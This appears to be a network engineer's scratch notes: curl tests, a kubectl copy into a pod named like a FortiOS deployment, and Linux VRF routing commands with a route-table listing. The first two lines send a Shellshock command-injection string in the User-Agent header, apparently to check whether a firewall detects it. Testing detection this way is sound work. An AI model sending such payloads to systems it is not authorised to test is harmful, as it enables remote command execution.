curl -k -H "User-Agent: () { :; }; /bin/ls" https://1.1.1.1
curl -k -H "User-Agent: () { :; }; /bin/ls" http://10.2.128.3
kubectl cp ./curl-amd64 default/fos-deployment-74b478fc6c-7r4fp:/data/curl
#vrf command
ip route add default via 10.1.128.2 vrf test1
ip vrf exec test1 ping 8.8.8.8
ip vrf exec test1 curl https://1.1.1.1
ip route add 8.8.8.8/32 via 10.1.128.2 vrf test1
 ip route show vrf test1
default via 10.1.128.2 dev net1
1.1.1.1 via 10.1.128.2 dev net1
10.1.128.0/24 dev net1 proto kernel scope link src 10.1.128.3

